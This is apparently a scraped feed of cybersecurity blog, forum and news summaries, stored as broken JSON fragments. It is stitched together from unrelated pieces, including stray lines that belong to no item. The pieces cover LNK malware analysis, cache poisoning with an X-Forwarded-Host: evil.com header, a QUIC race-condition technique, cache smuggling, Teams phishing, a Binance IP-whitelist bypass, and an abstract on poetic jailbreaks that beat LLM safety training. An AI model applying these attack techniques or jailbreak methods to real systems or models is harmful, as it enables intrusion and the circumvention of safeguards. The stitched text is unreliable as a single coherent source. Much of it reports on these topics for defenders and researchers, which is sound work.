      "title": "Intel in LNK Files",
      "summary": "I was reading a pretty interesting write-up from Seqrite regarding, in part, the use of pseudo-polyglot documents. In this case, delivery occurred via ZIP archive that contains an LNK file and a PNG file. The PNG file is pseudo-polyglot file in question; the binary contents contain a series of commands to be executed via ftp.exe , followed by what appears to be a PDF document. The attack is initiated when the target user double clicks the LNK file; I'll leave the rest of the description to the author. I will say that I'm not used to the author's writing style, so it took me a bit of effort to get used to it, and to get a better view of what the author was trying to share. However, what did interest me more was that the threat actor's efforts included an LNK, something that had to be created on the threat actor's infrastructure before it was included in the archive. As such, from an intel perspective, LNK files are \"free money\", and something I've talked about here in this blog more than a few times. Using the hash provided in the write-up, I was able to find a sample to download and parse myself. The LNK file itself had very little actual metadata beyond what was shared in the write-up, but that was still very interesting to me. Take a look at the full set of metadata: guid {00021401-0000-0000-c000-000000000046} shitemidlist My Computer/C:\\/Windows/system32/cmd.exe **Shell Items Details (times in UTC)** C:0 M:0 A:0 Windows (9) C:0 M:0 A:0 system32 (9) C:0 M:0 A:0 cmd.exe (9) commandline /c ftp.exe -s:\"offsec-certified-professional.png\" iconfilename %ProgramFiles(x86)%\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe hotkey 0x0 showcmd 0x1 ***LinkFlags*** HasLinkTargetIDList|IsUnicode|HasArguments|HasIconLocation ***PropertyStoreDataBlock*** GUID/ID pairs: {46588ae2-4cbc-4338-bbfc-139326986dce}/4 SID: S-1-5-21-1526495471-1806070692-3097244026-1000 ***KnownFolderDataBlock*** GUID : {1ac14e77-02e7-4e5d-b744-2eb1ae5198b7} Folder: CSIDL_SYSTEM We can see that the shell item time stamps are zero'd out, there's no machineID or NetBIOS name listed, no volume serial number, etc. The dearth of metadata can be just as important, or even more so, than when an LNK file contains much more metadata. My most recent blog post on LNK file metadata , prior to this post, illustrates an LNK file that is rife with metadata. So, the LNK file used in the Seqrite campaign may be the result of using a specific tool to create the LNK file, or it may be the result of applying a process to the LNK file, after it was created, to \"scrub\" a lot of the metadata that we might expect to see. Either way, tracking this information can be very valuable for CTI teams, as the available metadata tells us something about the adversary. Also, strings such as the SID shown can be used to search for other, similar samples, in an effort to round out the adversary's intel picture.",

IT scrambled for hours trying to fix it. Restarted services, cleared caches, even tried rebuilding profiles from scratch. Nothing worked.

Even with constant-time code and zeroization routines, the moment a key touches conventional memory, it becomes part of the microarchitectural threat surface. I\u2019ve been working on a CMOS-compatible primitive called Atomic Memory\u2122 (also known as Read-Only-Once Memory, ROOM ) that enforces deterministic single-read semantics at the circuit level. When a secret is read once, the storage element physically collapses and becomes unrecoverable. The key literally cannot be read a second time \u2014 even after reset, power-cycling, or attacks on the microarchitecture. Because secrets never enter normal RAM, caches, speculative buffers, or DMA-accessible regions, it inherently prevents entire attack classes: Spectre/Meltdown-style transient execution leakage Cold-boot attacks and DRAM remanence extraction DMA/PCIe/Thunderbolt snooping Rowhammer disturbance/fault-induced reads Cache line scavenging & microarchitectural side channels Register remanence from imperfect zeroization Flash-based key provisioning leakage Firmware rollback replays to re-extract keys The only secure key is the one that no longer exists \u2014 and here, the hardware ensures that.

They\u2019re all in version 0.1.0 , fully CLI, functional \u2014 but definitely still maturing. I\u2019m sharing them here because I\u2019d really appreciate feedback, critiques, and suggestions from more experienced people in the field. They include AI-assisted reporting (technical/executive) , but that feature is still in its early stages and is more aligned with what I want to expand in the future. This is 100% non-commercial . If any of these tools is useful for learning or experimenting, that alone would make me happy. \ud83d\udd27 The Tools (all open-source) 1. Pythia \u2013 SQL Injection Clairvoyance Scanner Automated SQLi detection (boolean, error-based, time-based), payload rotation, diff-based analysis. GitHub: https://github.com/rodhnin/pythia-sql-clairvoyance 2. Asterion \u2013 Network & Domain Security Auditor (Minotaur Series) Multi-protocol auditing (SMB, RDP, LDAP/AD, Kerberos, SSH, DNS, SNMP) + Windows/Linux system checks. GitHub: https://github.com/rodhnin/asterion-network-minotaur (This one is my personal favorite and the most polished \u2014 it was the last one I built.) 3. Argus \u2013 WordPress Vulnerability Watcher Plugin/theme enumeration, version fingerprinting, misconfig checks, permission issues, authentication checks, etc. GitHub: https://github.com/rodhnin/argus-wp-watcher 4. Hephaestus \u2013 Server Forge Auditor (Apache/Nginx) Config/baseline checks, directory exposure, basic SSL tests, permissions, and hardening suggestions. GitHub: https://github.com/rodhnin/hephaestus-server-forger \ud83e\uddea Testing Labs (Important) I created small local testing labs for experimenting with all four tools. I strongly recommend using them primarily in labs because: The scanners are aggressive in their default configuration. They do not cause DoS , but they will generate alerts due to the volume of requests. Future versions will include better optimization, throttling, and adaptive scanning.

This is my first more serious position in the cybersecurity field and the team I am joining is being created at the moment. I am basically the first one for now as I know. Since the new place is working with a MSSP and I will be their contact point I thought that it might be a good idea to do some kind of assessment of their processes and overall quality of work. My first job in the field was for an MSSP and even though we gave it our all they way it worked made it hard to deliver quality results. I would also want to go over existing SOPs and incident response plan with a focus on how other teams are aware, involved and ready to cooperate when needed. Other than that I would also look into how firewall changes are done and how involved the security team is. Any other ideas that might help me have a strong start and work towards a more secure environment? To be honest I have never had an actual incident in my short career so far so I am quite nervous how I would deal with a potentially real threat. That is why I want to prepare as much as possible.

      "summary": "I\u2019ve been working in MDR for about three years and I\u2019ve hit a wall. The burnout is real. I\u2019m not looking to complain \u2014 I\u2019m just trying to understand my next steps and what jobs in cybersecurity would be a better fit long-term. For context: I\u2019m very comfortable with responsibility, pressure, and handling true positives. I\u2019m conscientious, I care about getting things right, and I actually enjoy the investigative side. That\u2019s not the issue. The issue is the lack of control and constant unpredictability baked into MDR. The nonstop queues, sudden escalations, constantly shifting priorities, and being judged more on speed than quality \u2014 it\u2019s draining me at this point. I don\u2019t feel valued, and the emotional toll is adding up. After 3 years of doing this full-time, I\u2019m genuinely burned out. I\u2019m not super in tune to my own emotions and feelings - I\u2019ve been feeling this way for a while but it\u2019s been so gradual I never really noticed. I\u2019m the sole income for my family, so I can\u2019t take risky leaps or big pay cuts. I need stability, predictability, and a role where effort = outcome, not chaos = outcome. My goal: Find a remote cybersecurity role that is lower-stress, more structured, and pays enough for me to take home about $5,000/month (~75k gross would do this for me) after taxes. I know that\u2019s achievable in this field \u2014 I just don\u2019t know the best paths to transition into. I\u2019m looking for advice from people who have moved out of MDR/SOC into: \u2022 GRC \u2022 IAM \u2022 Vulnerability Management \u2022 Endpoint Security \u2022 Cloud security posture \u2022 Security awareness \u2022 Any stable non-reactive security roles How did you pivot? What skills did you highlight? Who\u2019s hiring remote for these roles right now? Anything I should do or avoid during the transition? Any guidance from people who\u2019ve been through this would be huge. I\u2019m at the point where I need a sustainable path forward in this industry, not another year of running on fumes. Thanks in advance. I expect the most common feedback will be to grind it out until the job market recovers. I know it\u2019s competitive for all roles, especially remote ones. submitted by /u/Bulky-Economy8565 [link] [comments]",

      "title": "Analysis of 8 Foundational Cache Poisoning Attacks (HackerOne, GitHub, Shopify) - Part 1",
      "summary": "Hi everyone, I've been doing a deep dive into Cache Poisoning to understand how the vulnerability class has evolved over the last decade. While modern attacks involve complex gadgets and framework confusion, I realized that to truly understand them, you have to look at the \"Foundational\" attacks\u2014the early logic flaws that started it all. I analyzed 8 historical case studies from public bug bounty reports. Here are the 3 most interesting patterns that paved the way for modern exploitation: 1. The HackerOne Classic (2014) The Flaw: The server trusted the X-Forwarded-Host header without validation. The Attack: Sending X-Forwarded-Host: evil.com caused the application to generate a redirect to the attacker's domain. The Impact: The cache stored this redirect. Any legitimate user trying to visit HackerOne was seamlessly redirected to the attacker's site. 2. GitHub's Content-Type DoS The Flaw: GitHub handled Content-Type headers differently for the cache vs. the backend. The Attack: An attacker could send a request with a malformed content type. The backend would return an error, but the cache would store that error for all unauthenticated users visiting that repo. The Result: A simple request could DoS a repository for everyone. 3. The Cloudflare Capitalization Bug The Flaw: Cloudflare normalized headers (converting TaRgEt.CoM to target.com for the cache key), but the origin server treated them as distinct. The Impact: This allowed attackers to bypass cache keys and poison the response for a massive number of websites behind the CDN. Why this matters today: Even though these are \"old\" reports, these exact logic flaws (normalization issues, unkeyed headers) are what cause the complex CP-DoS and secondary-context attacks we see in modern frameworks like Next.js today. I wrote a full breakdown of all 8 case studies (including Shopify, GitLab, and Red Hat) if you want to see the specific request/response pairs.

Given that the message originates from Microsoft's own infrastructure, it effectively bypasses SPF, DKIM, and DMARC checks. As a result, email security solutions are unlikely to flag the email as malicious. Should the victim end up accepting the invitation, they are granted guest access in the attacker's tenant, where all subsequent communication takes place. The threat actor can send phishing links or distribute malware-laced attachments by taking advantage of the lack of Safe Links and Safe Attachments scans. \"The victim's organization remains completely unaware,\" Downing said. \"Their security controls never triggered because the attack occurred outside their security boundary.\" submitted by /u/Natural_Sherbert_391 [link] [comments]",

In this case the PowerShell script doesn't download anything, and doesn't even require internet access. This bypasses any security controls reliant on monitoring or blocking PowerShell from making outbound connections. The way it works is by having the phishing page abuse the web browser's automatic caching of certain file types. It presents the malicious payload as an image/jpeg file type, triggering the browser to automatically download and cache it. The PowerShell script then simply extracts and runs the already downloaded payload from the web browser cache. While the technique, referred to as Cache Smuggling, has been know since 2023, this is the first time I've seen it combined with a FileFix style social engineering attack. https://expel.com/blog/cache-smuggling-when-a-picture-isnt-a-thousand-words/ submitted by /u/MalwareTech [link] [comments]",

Across 25 frontier proprietary and open-weight models, curated poetic prompts yielded high attack-success rates (ASR), with some providers exceeding 90%. Mapping prompts to MLCommons and EU CoP risk taxonomies shows that poetic attacks transfer across CBRN, manipulation, cyber-offence, and loss-of-control domains. Converting 1,200 ML-Commons harmful prompts into verse via a standardized meta-prompt produced ASRs up to 18 times higher than their prose baselines. Outputs are evaluated using an ensemble of 3 open-weight LLM judges, whose binary safety assessments were validated on a stratified human-labeled subset. Poetic framing achieved an average jailbreak success rate of 62% for hand-crafted poems and approximately 43% for meta-prompt conversions (compared to non-poetic baselines), substantially outperforming non-poetic baselines and revealing a systematic vulnerability across model families and safety training approaches. These findings demonstrate that stylistic variation alone can circumvent contemporary safety mechanisms, suggesting fundamental limitations in current alignment methods and evaluation protocols...",

Meanwhile, we look at how a worker at a cybersecurity firm allegedly leaked internal information to a hacking gang - raising big questions about insider threats. Plus: Frankenstein on Netflix, Vine nostalgia, and why Barney the Dinosaur may be the true criminal mastermind behind it all. All this and more is discussed in episode 445 of the \u201cSmashing Security\u201d podcast with cybersecurity veteran Graham Cluley, and special guest Dan Raywood.",

      "title": "From Compliance to Covert Ops: Demystifying the Offensive Security Landscape",
      "summary": "The merits of deploying offensive testing to strengthen an organization\u2019s security posture are well-understood by today\u2019s security leadership. Much to the relief of defenders, obtaining approval for an offensive security exercise has never been easier. However, the process of selecting the most appropriate offensive testing solution requires untangling overlapping definitions and vaguely defined terminology that leaves security teams more confused than when they started. How is an Adversary Emulation different from a Red Team ? What about this new Breach and Attack Simulation (BAS) tool that has been receiving great publicity recently? Would it be simpler to just invest in a Penetration Test instead? To help break all this down, we will provide a framework to understand the value proposition of different offensive security services from a defender\u2019s perspective, focusing on the core assumptions underlying each solution\u2019s methodology. We will also identify important factors that help with narrowing down which form of offensive testing is best suited for your organization. The Ends and The Means To understand the differences between types of offensive testing, consider the following: Are defenses being tested against attacks in general, or specific adversaries? Are offensive techniques being emulated for maximum realism, or simulated for rapid validation? This framework allows us to classify offensive security services into four general categories. Attack Adversary Simulation Breach and Attack Simulation (BAS) TTP-Agnostic Red Teaming Emulation Penetration Testing TTP-Driven Red Teaming Although there is often methodological overlap between the four quadrants, this model can be used to make sense of industry terminology from a defender\u2019s point of view by focusing on the how and the why of conducting offensive security testing. To use a domestic analogy, let\u2019s assume you want to ensure your home is safe from being broken into. The type of test you choose will dictate what you learn about your security posture. Breach and Attack Simulation (BAS) focuses on the repeatable execution of individual attacks, usually in an automated fashion, targeting specific defensive capabilities, much like trying the door handle every few hours to make sure the lock is engaged. Crucially, the focus is on ensuring that the lock\u2019s status is validated, and not on the specific mechanics of how the handle was engaged. Penetration Testing , on the other hand, is a time-bound, scoped assessment targeting a specific goal, usually with the full awareness of the internal security team. This is like hiring a professional burglar to attempt breaking in within a set duration, but with certain limits - lock picking is okay, but smashing the window is out of bounds! Red Teaming , whether TTP-driven or not, is a comprehensive exercise that targets an organization similar to how a real-life adversary would, often with no warning provided to defenders. Continuing our analogy, this is similar to tasking professionals with breaking into your house from start to finish, like a real burglar, with few restrictions. In this situation, you may want to smash the window to see if the home security service you paid for is worth the money. The Right Tool for the Job When selecting an offensive security service, organizations should first ensure that foundational defensive controls are in place. Engaging a Red Team without having validated basic controls will surface findings that would likely also have been discovered with Penetration Testing. First, leverage BAS to identify gaps and misconfigurations and validate the functionality of security tools. Subsequently, conducting Penetration Tests on internal networks and web applications can unearth additional vulnerabilities and attack paths in custom software and business logic. Finally, engaging in a Red Team will test defenders\u2019 readiness to combat a targeted, real-world attack by a sophisticated adversary. The choice of whether a Red Team is TTP-agnostic or TTP-driven (Adversary Emulation vs Simulation) will depend on whether you are concerned about specific threat actors or groups and are interested in testing tailored defenses, such as detection rules for TTPs used to target your industry. While it is tempting to jump directly to the \u201cmost realistic\u201d form of security testing, this misconception results in limited value being obtained from an offensive security exercise. Adversaries will take the path of least resistance into an organization - before smashing the window, a burglar will pick your lock, but before that, they will certainly just try the handle.",

Being somewhat, maybe even only slightly aware of the Windows Registry, I read the post with casual, even mild interest. Someone posted recently that cybersecurity runs on caffeine and sarcasm...I've got my cup of coffee right in front of me, and I've placed the sarcasm in front of us all. ;-) The RegRipper featureusage plugin was originally written in 2019, and includes a reference to a Crowdstrike blog post written in 2020, authored by Jai Minton (who is now with Huntress). The figure to the right was captured from the blog post, and provides a succinct description of how the AppSwitched key is populated. Specifically, Jai stated, \"This key provides the number of times an application switched focus (was left-clicked on the taskbar).\" This helps us understand a bit more about process execution, as for the application to exist on the taskbar and to have it's focus switched, that application has to have been executed. After finding and reading the blog post, I wrote a brief blog post here on this blog that mentioned the Registry key, and referenced Jai's blog post. To Maurice's point, this is, in fact, a valuable artifact, so kudos to Maurice for pointing it out and mentioning it again. If you read through the comments to Maurice's post, there are some hints there as to how to use the value data in your analysis. As you'll note, neither the value names nor the data itself includes a timestamp, but the AppSwitched subkey does have a LastWrite time, and this can be included in a timeline. The value names can be used as pivot points into a timeline, adding something of a \"third dimension\" to timeline analysis. You can use this alongside timestamped information, such as Prefetch entries, Registry data, SRUM DB data, etc.",

      "title": "Unprecedented Complexity",
      "summary": "I saw it again, just today. Another post on social media stating that IT teams/defenders \"face unprecedented complexity\". This one stood out amongst all of the posts proclaiming the need for agentic AI on the defender's side, due to how these agents were currently being employed on the attacker side. We hear things like \"autonomous agents\" being able to bring speed and scale to attacks. I will say that in my experience, defenders are always going to face complexity, but by it's very nature, I would be very reticent to call it \"unprecedented\". The reason for this is that cybersecurity is usually a bolted-on afterthought, one where the infrastructure already exists with a management culture that is completely against any sort of consolidated effort at overall \"control\". Most often, there's no single guiding policy or vision statement, specifically regarding cybersecurity. Many organizations and/or departments may not even fully understand their assets; what endpoints, both physical and virtual, are within their purview? How about applications running on those endpoints? And which of those assets are exposed to the public Internet, or even to access within the infrastructure itself, that don't need to be, or shouldn't be? For example, some applications, such as backup or accounting solutions , will install MSSQL \"under the hood\". Is your IT team aware of this, and if so, have they taken steps to secure this installation? From experience, most don't...the answer to both questions is a resounding \"IDK\". Default installations of MSSQL will send login failure attempts to the Application Event Log, but not successful logins. That only really matters if you're monitoring your logs in some way; many aren't, and even with SIEM solutions, these events are sometimes not included in monitoring. I've seen endpoints with upwards of 45K (yes, you read that right...) failed login attempts to MSSQL recorded in the Application Event Log, but this is most often on systems where the application doesn't rely on the MSSQL installation having hard-coded account credentials. The point is that basic IT hygiene starts with an accurate asset inventory, and is followed with attack surface reduction. Once you know what systems you have, and what applications should/need to be running on those systems, you can begin to address such things as logging configurations, monitoring (SIEM, EDR, etc.), etc. Attack surface reduction adds to increasing the efficacy of your controls, and to minimizing noise from false positives. Not only does this ensure that you're alerted when a security incident does occur, but it also provides for context, *and* it furthers your ability to quickly determine the nature, scope, and origin of the incident. I've seen organizations who are using SIEM, but the Security Event Log on many of their Windows endpoints are not logging either successful logins, nor failed login attempts. This is going to be something of a hot take for many readers, but right now, AI (and specifically agentic AI) is a distraction for defenders. Yes, based on what we're seeing through social media, agentic AI may be furthering threat actors by facilitating faster attacks, at scale, but when it comes right down to it, it's all about the speed and volume; exposure of vulnerable systems remains the same. It's the finding and exploiting the vulnerable systems that's gotten faster. The fact is that for the attacks to be successful, even with speed and scale, vulnerable systems need to be exposed to the Internet, and as such, accessed via some means. Yes, even endpoints not directly exposed to the Internet can be compromised via attacks such as phishing, SEO poisoning, or some other means that tricks the user into installing something that reaches out, but even some of these attacks can be inhibited or even obviated by some simple, free modifications to the endpoint itself.",

      "title": "Thoughts on Analysis",
      "summary": "Warning - before you get started reading this blog post, it's only fair that I warn you...in this post, I make the recommendation that you document your analysis process. If you find this traumatic, you might want to just move on. ;-) Robert Jan Mora, a name that I've known for some time within the DFIR community, recently posted something pretty fascinating on LinkedIn , having to do with a case that he worked a bit ago. His post, in turn, leads to this The Wire article , from India, and includes an interview with him. The \"so what\" of the article itself has to do with an initial report that states that no malware was present, and two subsequent reports, one of which is from Robert Jan's analysis, stating that malware was found on a USB device. In his LinkedIn post, Robert Jan emphasizes the need for malware scans in a law enforcement environment. Back when I first started working cases, even internally, in the early 2000s, I recommended the same thing, albeit with AV scanners not installed on imaged endpoint. Even more tools are available these days; for example, consider Yara, or something more along the lines of the Thor Scanner from Nextron Systems. To learn a bit more about this man, check out this Forensic Focus interview . Okay, but so what? Why does this matter, or why is it important? When looking to see if malware exists, or did exist on an endpoint, there are different approaches you can take, perhaps using AV scanners, or something like Yara. Or, sometimes, we may not find the actual malware itself, maybe not right away, but we will see clear indications of it's presence, or that it had executed. For example, if you've created a timeline of system activity, you may find a cluster of activity with different components derived from different sources, such as the Registry, Windows Event Log, file system, etc. Separately, these may not be entirely conclusive, but when viewed together, and within a narrow timeframe, they may provide clear indications of something having happened, much like finding footprints, disturbed earth, broken branches, and matted grass following the passage of an animal through a wilderness area. You can even find indications of malware having been or even executed on a system, while the executable itself no longer exists on the endpoint at the time of the investigation. Using sources such as the SRUM DB and/or AmCache.hve and PCA log files may provide valuable insights, even if the malware has been removed from the endpoint. When I was working PCI forensic investigations, our team had found that some of the malware used by the threat actors was based on a \"compiled\" Perl script, used to retrieve credit card numbers from a process memory dump. When run, the program extracted the Perl runtime from the EXE, and placed it in a particular folder path, and each time it was run, the path was slightly different; the final folder name changed. However, using file system metadata, we were able to determine a very explicit timeline of the compromise. Or, we may find indications that an attempt was made to execute the malware, but it failed, either because it was detected and quarantined, or because something caused it to crash. PCA log files and application pop-up/WER messages in the Application Event Log have proved to be very illuminating on some of the cases with which I've engaged. The key to all of this is to document your analysis process; if you don't know what you did, you can't make modifications or adjustments to the process. For example, if you have a memory dump, how did you go about searching for indications of a specific IP address? Volatility? Bulk_extractor? Don't remember/don't know? If you mounted the image and scanned it with AV, which one/version did you use? Knowing what you did, and what you found, means that you can then make adjustments and improvements to the process over time.",

The issue is that QUIC is designed to prevent network bottlenecks (HOL blocking), which is beneficial, but it disrupts the fundamental timing required for exploiting application-level race conditions. We tried all the obvious solutions, but QUIC's RFC essentially blocks fragmentation and other low-level network optimizations. \ud83e\udd37\u200d\u2642\ufe0f So, we figured out a way to synchronize things at the QUIC stream layer using a technique we call Quic-Fin-Sync . The gist: Set up 100+ requests, but hold back the absolute last byte of data for each one. The server gets 99.9% of the data but waits for that last byte. We send the final byte (and the crucial QUIC FIN flag) for all 100+ requests in one single UDP packet . This one packet forces the server to \"release\" all the requests into processing near-simultaneously. It worked way better than existing methods in our tests\u2014we successfully raced a vulnerable Keycloak setup over 40 times. If you are pentesting HTTP/3, grab the open-source tool and let us know what you break with it. The full write-up is below.

      "summary": "Black Friday Cyber Threats: As retail sales peak, cybercriminals ramp up attacks, targeting vulnerabilities in retail businesses during the holiday rush. Retailers Under Siege: In 2025, a significant number of retailers, including major brands, experienced increased cyberattacks, highlighting the urgent need for enhanced cybersecurity. Essential Security Measures: Implement comprehensive strategies such as employee training, securing POS systems, and adopting a Zero Trust Architecture to safeguard against emerging threats this Black Friday. Black Friday is only days away, and despite many stores sneaking holiday decorations onto their shelves since mid-September, it marks the official start of the December shopping frenzy. The coming days will not only bring a massive surge in sales, but also an equally large spike in cyber threats. For retailers of all sizes, this peak season is prime time for cybercriminals to exploit vulnerabilities. The 2025 LevelBlue Futures Report: Aligning Cyber Resilience and Business Goals in the Retail Sector highlights a critical disconnect: as attacks become more sophisticated, many retailers are confident yet underprepared. The Threat Landscape: Why Black Friday Is a Target Retail sector attacks in 2025 have been widespread and devastating, having caused severe operational issues even for prominent retailers like Harrods , Marks & Spencer , and Victoria\u2019s Secret . The continuing threat actor focus on retail, combined with the intense pressure of Black Friday, only amplifies the risk. The positive takeaway from these attacks is that they are forcing the C-Suite to take notice of their cybersecurity posture, but a gap remains between awareness and defense capability. High Volume of Attacks: 44% of retail executives report experiencing a significantly higher volume of attacks than 12 months ago, with 34% having suffered a breach in the past year. AI-Powered Threats Loom: Organizations expect a rise in AI-powered attacks, deepfakes, and synthetic identity fraud in 2025. Worryingly, only 25% say they are prepared for AI-powered threats, even though 45% expect them. Overconfidence Is a Risk: 49% of executives feel highly competent at defending against AI adversaries, but this confidence can lead to complacency. Even confident teams can miss fast-evolving threat vectors without clear, organized oversight. The data is clear: the threat is real, rapidly evolving, and is not slowing down for the holidays. Six Critical Steps to Cyber Resilience for Black Friday To protect your business and customers during the busiest shopping event of the year, you must integrate comprehensive cyber resilience into your immediate Black Friday preparation plan. 1. Prioritize Employee Training and Phishing Defense Your staff is your first line of defense, especially against social engineering attacks, which are becoming more persuasive thanks to AI. Educate Staff on Phishing Scams: Ensure employees know how to recognize and report suspicious emails, links, or attachments, especially those involving payments or sensitive data. 63% of executives say it\u2019s becoming more difficult for employees to identify real threats. In-Store Fraud Awareness: Train staff to spot physical credit card fraud. Look for poor-quality holograms/logos, irregular card embossing, tampered signature panels, and suspicious customer behavior (e.g., nervousness, rushing, insisting on multiple declined cards). Strong Authentication: Enforce the use of unique, complex passwords and Two-Factor Authentication (2FA) for all systems accessing sensitive information. 2. Secure Your Point-of-Sale (POS) and Payment Systems POS systems are a primary target as they handle sensitive financial information. Keep Systems Updated: Regularly update all POS software and hardware with the latest security patches to close known vulnerabilities. Network Separation: Isolate your POS network from guest Wi-Fi and other operational networks using firewalls and anti-malware protection . Modern Payment Security: Adopt EMV chip readers and accept digital wallets (Apple Pay, Google Pay) , which use tokenization to avoid sharing actual card information, significantly reducing fraud risk. Online Sales Authentication: For e-commerce, implement CAPTCHA to block bots and 3D Secure Authentication for credit card payments to verify the customer\u2019s identity during checkout, reducing card-not-present fraud. 3. Strengthen Your Software Supply Chain The holiday season often involves integrating new tools or working with more vendors. Retail organizations are underestimating the risks posed by their ecosystem. Increase Visibility: 47% of executives have very low to moderate visibility into their software supply chain. You must push for better insight. Vet Third-Party Vendors: Only 22% of retailers prioritize engaging with suppliers about their security credentials. Immediately vet all third-party apps and services used for e-commerce, payment processing, or customer management. Limit Access: Only grant vendors the minimal access they need. Immediately revoke access for any vendor or integration no longer in use. 4. Adopt a Proactive, Zero Trust Architecture Move from a reactive to a proactive security posture. A Zero Trust Architecture (ZTA) is a foundational strategy for a multi-layered defense. Move to ZTA: ZTA helps identify suspicious behavior quickly by implementing the principle of \u201cnever trust, always verify.\u201d While only 32% of retailers are making a significant investment in ZTA, it is a critical investment that provides additional layers of protection against unpredictable threats such as ransomware and sophisticated attacks. Invest in Resilience: Focus investments on Application security (66%) and Cyber-resilience processes across the business (65%) to get ahead of risks. External Support: 45% of retailers intend to work with threat intelligence providers in the next two years. Engage external specialists for training, incident response planning, and to help strengthen your defenses. 5. Safeguard Customer Data The risk of a data breach is highest when transaction volume is high. Limit Collection: Only collect the customer information you absolutely need for the transaction. Encryption is Non-Negotiable: Use encryption to protect sensitive data both in transit and at rest. Ensure any stored customer information is securely encrypted and maintained in compliance with standards like PCI DSS . Regular Data Backups: Have an automated, tested, and secure data backup plan. Store backups in a separate, secure location (like cloud storage) disconnected from your main network to ensure you can recover quickly from a ransomware or data-loss event. 6. Push Cyber Resilience Up the Organization For security measures to be effective during a crisis like a DDoS attack or a breach, they must be supported from the top down. Boardroom Engagement: Increase engagement among leadership so that cyber resilience is viewed as a core business function , not just an IT issue. Accountability: 51% of executives say leadership roles are measured against cybersecurity performance indicators\u2014this needs to be an organization-wide mandate to foster a resilient culture. Alignment: Integrate security into business decisions from the beginning, including allocating a cybersecurity budget for new initiatives right from the start. The Black Friday 2025 shopping season will test the resilience of every retailer. By leveraging insights from the LevelBlue Futures Report and implementing these protective measures, you can move past overconfidence and transform your cybersecurity into a competitive advantage, ensuring a secure and profitable holiday.",

      "summary": "Hi all, I\u2019ve published a technical case study analyzing a design issue in how the Binance API enforces IP whitelisting. This is not about account takeover or fund theft \u2014 it\u2019s about a trust-boundary mismatch between the API key and the secondary listenKey used for WebSocket streams. Summary of the issue A listenKey can be created using only the API key (no secret, no signature). The API key is protected by IP whitelisting. The listenKey is not protected by IP whitelisting. Once a listenKey leaks anywhere in the toolchain \u2014 debug logs, third-party libraries, bots, browser extensions, supply-chain modules \u2014 it can be reused from any IP address. This exposes real-time trading activity , balances, open orders, leverage changes, stop levels, liquidation events and more. This is not a direct account compromise. It\u2019s market-intelligence leakage , which can be extremely valuable when aggregated across many users or bot frameworks. Why this matters Many users rely on IP whitelisting as their final defensive barrier. The listenKey silently bypasses that assumption. This creates a false sense of security and enables unexpected data exposure patterns that users are not aware of. Disclosure process I responsibly reported this and waited ~11 months. The issue was repeatedly categorized as \u201csocial engineering,\u201d despite clear architectural implications. Therefore, I have published the analysis openly.

These cyber actors use tactics such as: Phishing and malicious device-linking QR codes to compromise victim accounts and link them to actor-controlled devices. Zero-click exploits, 2 which require no direct action from the device user. Impersonation 3 of messaging app platforms, such as Signal and WhatsApp. While current targeting remains opportunistic, evidence suggests these cyber actors focus on high-value individuals, such as current and former high-ranking government, military, and political officials, 4 as well as civil society organizations (CSOs) and individuals across the United States, 5 Middle East, 6 and Europe. 7 CISA strongly encourages messaging app users to review the updated Mobile Communications Best Practice Guidance and Mitigating Cyber Threats with Limited Resources: Guidance for Civil Society for steps to protect mobile communications and messaging apps, as well as mitigations against spyware.

Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities established the KEV Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the BOD 22-01 Fact Sheet for more information. Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of KEV Catalog vulnerabilities as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the specified criteria .",

      "summary": "Posted by Dave Kleidermacher, VP, Platforms Security & Privacy, Google Technology should bring people closer together, not create walls. Being able to communicate and connect with friends and family should be easy regardless of the phone they use. That\u2019s why Android has been building experiences that help you stay connected across platforms. As part of our efforts to continue to make cross-platform communication more seamless for users, we've made Quick Share interoperable with AirDrop, allowing for two-way file sharing between Android and iOS devices, starting with the Pixel 10 Family. This new feature makes it possible to quickly share your photos, videos, and files with people you choose to communicate with, without worrying about the kind of phone they use. Most importantly, when you share personal files and content, you need to trust that it stays secure. You can share across devices with confidence knowing we built this feature with security at its core, protecting your data with strong safeguards that have been tested by independent security experts. Secure by Design We built Quick Share\u2019s interoperability support for AirDrop with the same rigorous security standards that we apply to all Google products. Our approach to security is proactive and deeply integrated into every stage of the development process. This includes: Threat Modeling: We identify and address potential security risks before they can become a problem. Internal Security Design and Privacy Reviews: Our dedicated security and privacy teams thoroughly review the design to ensure it meets our high standards. Internal Penetration Testing: We conduct extensive in-house testing to identify and fix vulnerabilities. This Secure by Design philosophy ensures that all of our products are not just functional but also fundamentally secure. This feature is also protected by a multi-layered security approach to ensure a safe sharing experience from end-to-end, regardless of what platform you\u2019re on. Secure Sharing Channel: The communication channel itself is hardened by our use of Rust to develop this feature. This memory-safe language is the industry benchmark for building secure systems and provides confidence that the connection is protected against buffer overflow attacks and other common vulnerabilities. Built-in Platform Protections: This feature is strengthened by the robust built-in security of both Android and iOS. On Android, security is built in at every layer. Our deep investment in Rust at the OS level hardens the foundation, while proactive defenses like Google Play Protect work to keep your device safe. This is complemented by the security architecture of iOS that provides its own strong safeguards that mitigate malicious files and exploitation. These overlapping protections on both platforms work in concert with the secure connection to provide comprehensive safety for your data when you share or receive. You\u2019re in Control: Sharing across platforms works just like you're used to: a file requires your approval before being received, so you're in control of what you accept. The Power of Rust: A Foundation of Secure Communication A key element of our security strategy for the interoperability layer between Quick Share and AirDrop is the use of the memory-safe Rust programming language. Recognized by security agencies around the world, including the NSA and CISA , Rust is widely considered the industry benchmark for building secure systems because it eliminates entire classes of memory-safety vulnerabilities by design. Rust is already a cornerstone of our broader initiative to eliminate memory safety bugs across Android. Its selection for this feature was deliberate, driven by the unique security challenges of cross-platform communication that demanded the most robust protections for memory safety. The core of this feature involves receiving and parsing data sent over a wireless protocol from another device. Historically, when using a memory-unsafe language, bugs in data parsing logic are one of the most common sources of high-severity security vulnerabilities. A malformed data packet sent to a parser written in a memory-unsafe language can lead to buffer overflows and other memory corruption bugs, creating an opportunity for code execution. This is precisely where Rust provides a robust defense. Its compiler enforces strict ownership and borrowing rules at compile time, which guarantees memory safety. Rust removes entire classes of memory-related bugs. This means our implementation is inherently resilient against attackers attempting to use maliciously crafted data packets to exploit memory errors. Secure Sharing Using AirDrop's \"Everyone\" Mode To 